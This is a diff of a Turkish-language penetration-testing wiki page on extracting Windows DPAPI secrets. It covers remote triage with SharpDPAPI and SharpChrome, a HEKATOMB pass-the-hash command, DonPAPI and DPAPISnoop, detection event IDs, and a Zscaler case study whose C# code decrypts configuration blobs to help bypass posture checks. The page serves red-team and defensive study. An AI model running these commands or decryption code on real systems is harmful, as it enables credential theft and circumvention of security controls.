+In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. Elbette o makineye erişim sağlayabilmeniz gerekir ve aşağıdaki örnekte **domain backup encryption key is known** varsayılmaktadır:
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
@@ -347,50 +347,47 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 ### HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) LDAP dizininden tüm kullanıcıların ve bilgisayarların çıkarılmasını ve RPC üzerinden domain denetleyicisinin yedek anahtarının çıkarılmasını otomatikleştiren bir araçtır. Script daha sonra tüm bilgisayarların IP adreslerini çözecek ve smbclient ile tüm bilgisayarlarda tüm kullanıcıların DPAPI blob'larını alıp domain yedek anahtarı ile her şeyi şifre çözecektir.
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) LDAP dizininden tüm kullanıcıları ve bilgisayarları çıkarmayı ve RPC üzerinden domain controller yedek anahtarını (backup key) çıkarmayı otomatikleştiren bir araçtır. Script daha sonra tüm bilgisayarların IP adreslerini çözer ve tüm bilgisayarlarda smbclient çalıştırarak tüm kullanıcıların DPAPI blob'larını alır ve her şeyi domain backup key ile deşifre eder.
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-LDAP'tan çıkarılmış bilgisayar listesiyle, bilmeseniz bile her alt ağı bulabilirsiniz!
+LDAP'tan çıkarılan bilgisayar listesi ile, daha önce bilmediğiniz alt ağların her birini bulabilirsiniz!
 
 ### DonPAPI 2.x (2024-05)
 
 [**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI ile korunan sırları otomatik olarak dökebilir. 2.x sürümü şunları getirdi:
 
-* Yüzlerce hosttan blob'ların paralel toplanması
-* **context 3** masterkey'lerinin parse edilmesi ve Hashcat ile otomatik kırma entegrasyonu
-* Chrome "App-Bound" şifreli çerezleri için destek (bkz. sonraki bölüm)
-* Yeni bir **`--snapshot`** modu; endpoint'leri tekrarlı olarak sorgulayıp yeni oluşturulan blob'larda diff alır
+* Yüzlerce host'tan blob'ların paralel toplanması
+* **context 3** masterkey'lerinin parse edilmesi ve otomatik Hashcat kırma entegrasyonu
+* Chrome "App-Bound" şifreli çerezler için destek (bir sonraki bölüme bakın)
+* Uç noktaları tekrar tekrar sorgulayan ve yeni oluşturulan blob'ları diffleyen yeni **`--snapshot`** modu
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault dosyaları için bir C# parser'ıdır; Hashcat/JtR formatları üretebilir ve isteğe bağlı olarak kırmayı otomatik başlatabilir. Windows 11 24H1'e kadar hem machine hem de user masterkey formatlarını tam olarak destekler.
-
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault dosyalarını parse eden bir C# aracıdır; Hashcat/JtR formatları çıktılayabilir ve isteğe bağlı olarak kırmayı otomatik olarak başlatabilir. Windows 11 24H1'e kadar machine ve user masterkey formatlarını tam olarak destekler.
 
 ## Yaygın tespitler
 
-- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve diğer DPAPI ile ilişkili dizinlerdeki dosyalara erişim.
-- Özellikle **C$** veya **ADMIN$** gibi bir ağ paylaşımından.
-- LSASS belleğine erişmek veya masterkey'leri dökmek için **Mimikatz**, **SharpDPAPI** veya benzeri araçların kullanılması.
-- Etkinlik **4662**: *An operation was performed on an object* – bu, **`BCKUPKEY`** nesnesine erişim ile ilişkilendirilebilir.
-- Etkinlik **4673/4674** – bir süreç *SeTrustedCredManAccessPrivilege* (Credential Manager) talep ettiğinde
-
+- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve diğer DPAPI ile ilgili dizinlere erişim.
+- Özellikle **C$** veya **ADMIN$** gibi bir ağ paylaşımından erişimler.
+- LSASS belleğine erişmek veya masterkey'leri dökmek için **Mimikatz**, **SharpDPAPI** veya benzeri araçların kullanımı.
+- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** nesnesine erişim ile korelasyon kurulabilir.
+- Bir süreç *SeTrustedCredManAccessPrivilege* (Credential Manager) talep ettiğinde Event **4673/4674**
 
 ---
-### 2023-2025 güvenlik açıkları & ekosistem değişiklikleri
+### 2023-2025 güvenlik açıkları ve ekosistem değişiklikleri
 
-* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Ağ erişimi olan bir saldırgan, bir domain üyesini kötü niyetli bir DPAPI yedek anahtarını aldıracak şekilde kandırabilir; bu da kullanıcı masterkey'lerinin şifre çözülmesine olanak verir. Kasım 2023 toplu güncellemesinde yamalandı – yöneticiler DC'lerin ve iş istasyonlarının tamamen güncel olduğundan emin olmalıdır.
-* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024) eski yalnızca DPAPI korumasını, kullanıcının **Credential Manager** altında saklanan ek bir anahtar ile değiştirdi. Çerezlerin çevrimdışı şifre çözümü artık hem DPAPI masterkey hem de **GCM-wrapped app-bound key** gerektiriyor. SharpChrome v2.3 ve DonPAPI 2.x, kullanıcı bağlamında çalıştırıldıklarında ekstra anahtarı kurtarabilirler.
+* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Ağ erişimi olan bir saldırgan, bir domain üyesini kötü amaçlı bir DPAPI backup key almaya kandırarak kullanıcı masterkey'lerini deşifre etmesine olanak sağlayabiliyordu. Kasım 2023 toplu güncellemesinde yamalandı – yöneticiler DC'lerin ve iş istasyonlarının tamamen yamalı olduğundan emin olmalıdır.
+* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024) eski DPAPI-yalnız korumayı, kullanıcının **Credential Manager** altında saklanan ek bir anahtar ile değiştirdi. Çerezlerin çevrimdışı deşifresi artık hem DPAPI masterkey hem de **GCM-wrapped app-bound key** gerektirmektedir. SharpChrome v2.3 ve DonPAPI 2.x, kullanıcı bağlamında çalıştırıldığında ekstra anahtarı kurtarabilir.
 
+### Vaka İncelemesi: Zscaler Client Connector – SID'den Türetilen Özel Entropi
 
-### Vaka İncelemesi: Zscaler Client Connector – SID'den türetilen özel entropi
+Zscaler Client Connector birkaç konfigürasyon dosyasını `C:\ProgramData\Zscaler` altında saklar (ör. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenmiştir ancak satıcı diske kaydedilmek yerine *runtime* sırasında hesaplanan **custom entropy** sağlar.
 
-Zscaler Client Connector `C:\ProgramData\Zscaler` altında birkaç yapılandırma dosyası saklar (örn. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenmiştir ancak satıcı, diske kaydedilmek yerine *çalışma zamanında hesaplanan* **custom entropy** sağlar.
+Entropi iki elemandan yeniden oluşturulur:
 
-Entropi iki öğeden yeniden oluşturulur:
-
-1. `ZSACredentialProvider.dll` içine gömülmüş hard-coded bir gizli değer.
-2. Yapılandırmanın ait olduğu Windows hesabının **SID**'i.
+1. `ZSACredentialProvider.dll` içinde gömülü hard-code edilmiş bir gizli değer.
+2. Konfigürasyonun ait olduğu Windows hesabının **SID**'i.
 
 DLL tarafından uygulanan algoritma eşdeğerdir:
 ```csharp
@@ -407,17 +404,17 @@ byte[] entropy = new byte[tmp.Length / 2];
 for (int i = 0; i < entropy.Length; i++)
 entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
 ```
-Gizli veri diskte okunabilen bir DLL'e gömülü olduğundan, **SYSTEM yetkisine sahip herhangi bir yerel saldırgan herhangi bir SID için entropiyi yeniden üretebilir** ve blob'ları çevrimdışı olarak çözebilir:
+Çünkü gizli, disketen okunabilen bir DLL içinde gömülü olduğu için, **SYSTEM haklarına sahip herhangi bir yerel saldırgan herhangi bir SID için entropiyi yeniden oluşturabilir** ve blob'ların şifresini çevrimdışı çözebilir:
 ```csharp
 byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
 byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
 Console.WriteLine(Encoding.UTF8.GetString(clear));
 ```
-Şifre çözme, her bir **device posture check** ve beklenen değeri de içeren eksiksiz JSON yapılandırmasını verir — bu bilgiler, client-side bypasses girişimlerinde çok değerlidir.
+Şifre çözme, her bir **device posture check** ve beklenen değeri de içeren tam JSON yapılandırmasını verir — istemci tarafı bypass denemelerinde çok değerli olan bilgiler.
 
-> TIP: diğer şifrelenmiş artefaktlar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropy olmadan** (`16` sıfır byte) korunur. Bu nedenle SYSTEM ayrıcalıkları elde edildiğinde `ProtectedData.Unprotect` ile doğrudan çözülebilirler.
+> İPUCU: Diğer şifrelenmiş artefaktlar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI ile **entropi olmadan** (`16` sıfır bayt) korunur. Bu nedenle SYSTEM ayrıcalıkları elde edildikten sonra `ProtectedData.Unprotect` ile doğrudan çözülebilirler.
 
-## Kaynaklar
+## Referanslar
 
 - [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
